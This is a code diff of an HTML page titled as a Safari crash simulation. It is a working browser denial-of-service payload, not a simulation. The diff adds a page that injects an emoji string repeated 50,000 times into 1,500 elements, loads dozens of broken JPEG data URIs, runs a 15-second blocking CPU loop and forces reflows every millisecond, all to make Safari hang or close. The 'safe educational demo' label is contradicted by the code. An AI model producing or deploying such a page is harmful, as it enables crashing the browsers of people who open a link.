@@ -3,29 +3,46 @@
 <head>
   <meta charset="UTF-8">
   <title>iPhone Safari Crash Simulation</title>
+  <style>
+    body {
+      background: #111;
+      color: white;
+      font-family: sans-serif;
+      text-align: center;
+    }
+    img {
+      max-width: 100%;
+      margin: 20px 0;
+    }
+  </style>
 </head>
 <body>
   <h1>Safari Crash Simulation</h1>
-  <p>This is a safe educational demo that may cause Safari to close.</p>
+  <p>This safe demo may cause Safari to close due to heavy memory use.</p>
 
   <script>
-    // Unicode bomb string (safe but heavy for rendering)
-    const bomb = "&#x1F4A5;".repeat(50000);
-
-    // Create a large number of elements to overload rendering
-    for (let i = 0; i < 2000; i++) {
+    // 1. Unicode rendering bomb
+    const bomb = "💥".repeat(50000);
+    for (let i = 0; i < 1500; i++) {
       const div = document.createElement("div");
       div.innerHTML = bomb;
       document.body.appendChild(div);
     }
 
-    // Heavy CPU loop to simulate processing load
+    // 2. Corrupted-like image load attempt
+    for (let i = 0; i < 50; i++) {
+      const img = new Image();
+      img.src = "data:image/jpeg;base64,/9j/4QAYRXhpZgAASUkqAAgAAAAHABIBAwABAAAAAQAAABoBBQABAAAAeAAAABsBBQABAAAAfAAAACgBAwABAAAAAgAAAAABAgAJAAAAggAAADEBAgANAAAAhgAAADIBAwABAAAAAQAAABoBBQABAAAAjAAAABsBBQABAAAAkAAA"; // short broken JPEG
+      document.body.appendChild(img);
+    }
+
+    // 3. Heavy CPU loop
     let start = Date.now();
     while (Date.now() - start < 15000) {
       Math.sqrt(Math.random() * 999999);
     }
 
-    // Keep forcing reflows
+    // 4. Continuous style reflow
     setInterval(() => {
       document.body.style.transform = `rotate(${Math.random()}deg)`;
     }, 1);
